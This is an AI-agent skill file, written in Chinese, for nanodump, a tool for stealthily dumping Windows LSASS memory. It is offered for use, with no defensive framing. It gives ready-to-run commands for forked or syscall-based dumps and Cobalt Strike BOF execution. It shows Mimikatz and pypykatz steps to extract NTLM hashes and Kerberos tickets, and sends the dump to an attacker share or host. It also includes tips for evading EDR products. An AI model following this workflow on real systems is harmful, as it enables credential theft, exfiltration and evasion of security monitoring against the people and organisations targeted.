---
name: nanodump
description: >
  此技能适用于用户询问关于 "nanodump"、"转储 LSASS 内存以提取凭据"、
  "在不触发 EDR 的情况下创建 LSASS 迷你转储"、"从内存提取 NTLM 哈希和 Kerberos 票据"、
  "在 Windows 主机上执行隐蔽凭据转储" 的问题。
---

# nanodump

隐蔽的 LSASS 内存转储工具 — 使用系统调用和 fork 技术绕过现代 EDR。

## 核心概念

nanodump 通过以下技术创建 LSASS 进程的迷你转储：
- **直接系统调用** (绕过已被钩挂的 ntdll API)
- **Fork + minidump**（转储 LSASS 的 fork 进程，而非 LSASS 本身）
- **句柄复制** (利用已有的句柄)
- 从其他进程获取的**提升句柄**
- **静默进程退出** 技术

生成的 `.dmp` 文件可离线用 Mimikatz 解析。

## 快速开始

```cmd
# 基础转储（通过 LSASS fork，最隐蔽）
nanodump.exe --fork --write C:\Windows\Temp\lsass.dmp

# 通过系统调用写入文件的转储
nanodump.exe --write C:\Windows\Temp\lsass.dmp

# 在 Cobalt Strike 中以 BOF 方式使用
inline-execute nanodump.o --fork --write lsass.dmp
```

## 核心参数

| 参数 | 说明 |
|------|-------------|
| `--write <path>` | 转储文件写入路径 |
| `--fork` | 在转储前 fork LSASS（隐蔽） |
| `--snapshot` | 使用进程快照（NtCreateProcessEx） |
| `--dup` | 从另一进程复制 LSASS 句柄 |
| `--elevate-handle` | 通过其他进程的已有句柄提升权限 |
| `--silent-process-exit` | 使用 SilentProcessExit 技术转储 |
| `--pid <n>` | 手动指定 LSASS PID |
| `--sec-logon` | 使用辅助登录句柄 |
| `--malseclogon` | 滥用 MalSecLogon 技术 |
| `--help` | 显示所有选项 |

## 转储后：凭据提取

```bash
# 将转储传至 Linux 并用 pypykatz 解析
pypykatz lsa minidump lsass.dmp

# 在 Windows 上用 Mimikatz 解析
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords

# 仅提取 NTLM 哈希
pypykatz lsa minidump lsass.dmp -o hashes.txt
```

## 常见工作流

```cmd
# 最隐蔽方案：fork + 写入临时目录
nanodump.exe --fork --write C:\Windows\Temp\lsass.dmp

# 将转储传至攻击机
# 通过 Cobalt Strike：download C:\Windows\Temp\lsass.dmp
# 通过 SMB：copy lsass.dmp \\attacker\share\

# 在 Kali 上解析
pypykatz lsa minidump lsass.dmp

# 在 CS 中以 BOF 方式使用
inline-execute nanodump.o --fork --write lsass.dmp
download lsass.dmp
```

## 检测规避说明

- `--fork` 避免直接访问 LSASS — EDR 看到的是 fork 进程而非 LSASS 转储
- 直接系统调用绕过用户态 API 钩子（CrowdStrike、Defender ATP）
- 结合进程伪装可获得额外规避效果
- 避免写入可预测路径（`C:\Windows\Temp\lsass.dmp` 已被监控）

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/lsass-techniques.md` | 所有 LSASS 转储技术、pypykatz 解析、哈希提取、检测态势 |
